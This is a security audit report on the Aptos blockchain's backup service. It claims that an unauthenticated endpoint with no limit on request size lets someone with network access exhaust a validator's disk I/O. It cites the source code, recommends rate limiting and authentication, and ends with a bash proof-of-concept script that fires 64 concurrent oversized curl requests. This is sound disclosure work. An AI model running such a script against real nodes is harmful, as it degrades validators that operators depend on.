# Audit Report

## Title
Unauthenticated Backup Service Allows Resource Exhaustion Attack Causing Validator Performance Degradation

## Summary

The backup service exposes an unauthenticated HTTP endpoint that allows unlimited concurrent requests for transaction data without rate limiting or request size validation. A malicious operator with network access to the backup service (port 6186) can trigger excessive disk I/O that degrades validator performance and impacts consensus participation, violating liveness guarantees.

## Finding Description

The `get_transaction_iter()` function in `BackupHandler` creates RocksDB iterators to stream transaction data without validating the `num_transactions` parameter or implementing rate limiting. [1](#0-0) 

This function is exposed via an unauthenticated HTTP endpoint without access controls: [2](#0-1) 

The backup service has no authentication mechanism and relies solely on network-level access control: [3](#0-2) 

In production fullnode deployments, the backup service is configured to listen on all network interfaces (0.0.0.0:6186), not just localhost: [4](#0-3) 

**Critical Missing Protections:**

1. **No request size validation**: Unlike the regular DB reader which enforces `MAX_REQUEST_LIMIT = 20,000`, the backup handler accepts unlimited `num_transactions` values: [5](#0-4) 

2. **Limited concurrency control**: The backup runtime has only 64 concurrent blocking threads, allowing up to 64 simultaneous large requests: [6](#0-5) 

3. **Disk I/O amplification**: Each request creates 5 separate RocksDB iterators (transactions, transaction_info, events, write_sets, persisted_auxiliary_info), multiplying the disk I/O load: [7](#0-6) 

**Attack Scenario:**

A malicious operator with network access to port 6186 (through cluster access, compromised infrastructure, or misconfigured network policies) sends 64 concurrent requests:

```
GET /transactions/0/10000000
GET /transactions/1000000/10000000  
GET /transactions/2000000/10000000
... (64 concurrent requests)
```

This creates 320 concurrent RocksDB iterators (64 requests × 5 databases), each performing sequential disk reads. The sustained disk I/O:

- Saturates disk IOPS and increases read latency
- Pollutes the OS page cache with historical data
- Delays consensus operations that require disk access (block proposals, state commits)
- Causes validators to miss consensus timeouts
- Violates **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits"

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos Bug Bounty program because it causes "Validator node slowdowns" (explicitly listed as High Severity). The attack:

- Degrades validator performance during active consensus
- Can cause missed consensus rounds due to I/O-induced timeouts
- Impacts consensus participation and liveness guarantees
- Affects all validators running the standard fullnode configuration where the backup service is network-accessible

While this does not cause permanent network partition or fund loss (which would be Critical), it represents a significant operational security issue that can be triggered by a malicious operator to disrupt validator operations.

## Likelihood Explanation

**Likelihood: Medium to High** in specific deployment contexts:

**Attack Requirements:**
- Network access to port 6186 (typically internal cluster access)
- Knowledge of the backup service API (publicly documented)
- Ability to send HTTP requests

**Deployment Reality:**
- Default configuration (localhost:6186) is safe from external attacks
- Production fullnode deployments bind to 0.0.0.0:6186 by configuration
- Exposed as Kubernetes ClusterIP service (internal cluster access)
- Accessible to malicious operators, compromised cluster components, or through network misconfigurations

The security question specifically scopes this to "malicious operator" scenarios, which are realistic in multi-tenant infrastructure or when infrastructure is compromised. The attack is trivial to execute once network access is obtained.

## Recommendation

Implement multiple layers of protection:

**1. Add Request Size Validation**

```rust
pub fn get_transaction_iter(
    &self,
    start_version: Version,
    num_transactions: usize,
) -> Result<...> {
    // Add validation similar to regular DB reader
    const MAX_BACKUP_REQUEST_LIMIT: usize = 100_000;
    if num_transactions > MAX_BACKUP_REQUEST_LIMIT {
        return Err(AptosDbError::Other(format!(
            "Requested too many transactions. Max: {}, requested: {}",
            MAX_BACKUP_REQUEST_LIMIT, num_transactions
        )));
    }
    // ... rest of implementation
}
```

**2. Implement Rate Limiting**

Add per-client rate limiting in the backup service handlers using a token bucket or similar algorithm:

```rust
// In handlers/mod.rs
use governor::{Quota, RateLimiter};

// Limit to 10 requests per minute per client
let rate_limiter = RateLimiter::direct(Quota::per_minute(nonzero!(10u32)));
```

**3. Add Authentication**

Implement authentication middleware similar to the admin service: [8](#0-7) 

Add a configuration option for backup service authentication tokens.

**4. Implement Concurrency Limits Per Endpoint**

Add a semaphore to limit concurrent backup operations:

```rust
use tokio::sync::Semaphore;

const MAX_CONCURRENT_BACKUPS: usize = 4;
let backup_semaphore = Arc::new(Semaphore::new(MAX_CONCURRENT_BACKUPS));
```

**5. Configuration Recommendation**

Update default configuration guidance to emphasize keeping backup service on localhost unless explicitly required, and document the security implications of exposing it.

## Proof of Concept

```bash
#!/bin/bash
# PoC: Stress test backup service to demonstrate performance impact

BACKUP_SERVICE="http://backup-service:6186"
START_VERSION=0
NUM_TRANSACTIONS=10000000  # 10M transactions (no limit enforced)
CONCURRENT_REQUESTS=64

# Launch 64 concurrent large backup requests
for i in $(seq 1 $CONCURRENT_REQUESTS); do
  START=$((i * 1000000))
  curl -X GET "$BACKUP_SERVICE/transactions/$START/$NUM_TRANSACTIONS" \
    --output /dev/null --silent &
done

# Monitor disk I/O and validator metrics:
# - iostat -x 1  (observe disk utilization spike to 100%)
# - Check consensus round latency metrics (should increase)
# - Check validator participation (may drop due to timeouts)

wait
echo "Attack complete. Check validator performance metrics."
```

## Notes

This vulnerability exists because the backup service was designed for trusted backup infrastructure without anticipating insider threat scenarios. The security question specifically asks about "malicious operator" attacks, which represents a realistic threat model where an operator with cluster access or compromised infrastructure components can abuse the backup service to degrade validator performance.

The default localhost configuration provides adequate protection for single-operator deployments, but production deployments that expose the service on 0.0.0.0:6186 for backup infrastructure create an attack surface that should be protected with authentication and rate limiting.

### Citations

**File:** storage/aptosdb/src/backup/backup_handler.rs (L41-109)
```rust
    pub fn get_transaction_iter(
        &self,
        start_version: Version,
        num_transactions: usize,
    ) -> Result<
        impl Iterator<
                Item = Result<(
                    Transaction,
                    PersistedAuxiliaryInfo,
                    TransactionInfo,
                    Vec<ContractEvent>,
                    WriteSet,
                )>,
            > + '_,
    > {
        let txn_iter = self
            .ledger_db
            .transaction_db()
            .get_transaction_iter(start_version, num_transactions)?;
        let mut txn_info_iter = self
            .ledger_db
            .transaction_info_db()
            .get_transaction_info_iter(start_version, num_transactions)?;
        let mut event_vec_iter = self
            .ledger_db
            .event_db()
            .get_events_by_version_iter(start_version, num_transactions)?;
        let mut write_set_iter = self
            .ledger_db
            .write_set_db()
            .get_write_set_iter(start_version, num_transactions)?;
        let mut persisted_aux_info_iter = self
            .ledger_db
            .persisted_auxiliary_info_db()
            .get_persisted_auxiliary_info_iter(start_version, num_transactions)?;

        let zipped = txn_iter.enumerate().map(move |(idx, txn_res)| {
            let version = start_version + idx as u64; // overflow is impossible since it's check upon txn_iter construction.

            let txn = txn_res?;
            let txn_info = txn_info_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "TransactionInfo not found when Transaction exists, version {}",
                    version
                ))
            })??;
            let event_vec = event_vec_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "Events not found when Transaction exists., version {}",
                    version
                ))
            })??;
            let write_set = write_set_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "WriteSet not found when Transaction exists, version {}",
                    version
                ))
            })??;
            let persisted_aux_info = persisted_aux_info_iter.next().ok_or_else(|| {
                AptosDbError::NotFound(format!(
                    "PersistedAuxiliaryInfo not found when Transaction exists, version {}",
                    version
                ))
            })??;
            BACKUP_TXN_VERSION.set(version as i64);
            Ok((txn, persisted_aux_info, txn_info, event_vec, write_set))
        });
        Ok(zipped)
    }
```

**File:** storage/backup/backup-service/src/handlers/mod.rs (L101-110)
```rust
    // GET transactions/<start_version>/<num_transactions>
    let bh = backup_handler.clone();
    let transactions = warp::path!(Version / usize)
        .map(move |start_version, num_transactions| {
            reply_with_bytes_sender(&bh, TRANSACTIONS, move |bh, sender| {
                bh.get_transaction_iter(start_version, num_transactions)?
                    .try_for_each(|record_res| sender.send_size_prefixed_bcs_bytes(record_res?))
            })
        })
        .recover(handle_rejection);
```

**File:** storage/backup/backup-service/src/lib.rs (L12-30)
```rust
pub fn start_backup_service(address: SocketAddr, db: Arc<AptosDB>) -> Runtime {
    let backup_handler = db.get_backup_handler();
    let routes = get_routes(backup_handler);

    let runtime = aptos_runtimes::spawn_named_runtime("backup".into(), None);

    // Ensure that we actually bind to the socket first before spawning the
    // server tasks. This helps in tests to prevent races where a client attempts
    // to make a request before the server task is actually listening on the
    // socket.
    //
    // Note: we need to enter the runtime context first to actually bind, since
    //       tokio TcpListener can only be bound inside a tokio context.
    let _guard = runtime.enter();
    let server = warp::serve(routes).bind(address);
    runtime.handle().spawn(server);
    info!("Backup service spawned.");
    runtime
}
```

**File:** terraform/helm/fullnode/files/fullnode-base.yaml (L67-68)
```yaml
storage:
  backup_service_address: "0.0.0.0:6186"
```

**File:** storage/storage-interface/src/lib.rs (L56-58)
```rust
// This is last line of defense against large queries slipping through external facing interfaces,
// like the API and State Sync, etc.
pub const MAX_REQUEST_LIMIT: u64 = 20_000;
```

**File:** crates/aptos-runtimes/src/lib.rs (L27-50)
```rust
    const MAX_BLOCKING_THREADS: usize = 64;

    // Verify the given name has an appropriate length
    if thread_name.len() > MAX_THREAD_NAME_LENGTH {
        panic!(
            "The given runtime thread name is too long! Max length: {}, given name: {}",
            MAX_THREAD_NAME_LENGTH, thread_name
        );
    }

    // Create the runtime builder
    let atomic_id = AtomicUsize::new(0);
    let thread_name_clone = thread_name.clone();
    let mut builder = Builder::new_multi_thread();
    builder
        .thread_name_fn(move || {
            let id = atomic_id.fetch_add(1, Ordering::SeqCst);
            format!("{}-{}", thread_name_clone, id)
        })
        .on_thread_start(on_thread_start)
        .disable_lifo_slot()
        // Limit concurrent blocking tasks from spawn_blocking(), in case, for example, too many
        // Rest API calls overwhelm the node.
        .max_blocking_threads(MAX_BLOCKING_THREADS)
```

**File:** storage/aptosdb/src/ledger_db/transaction_db.rs (L63-71)
```rust
    pub(crate) fn get_transaction_iter(
        &self,
        start_version: Version,
        num_transactions: usize,
    ) -> Result<impl Iterator<Item = Result<Transaction>> + '_> {
        let mut iter = self.db.iter::<TransactionSchema>()?;
        iter.seek(&start_version)?;
        iter.expect_continuous_versions(start_version, num_transactions)
    }
```

**File:** config/src/config/storage_config.rs (L433-436)
```rust
impl Default for StorageConfig {
    fn default() -> StorageConfig {
        StorageConfig {
            backup_service_address: SocketAddr::new(IpAddr::V4(Ipv4Addr::LOCALHOST), 6186),
```
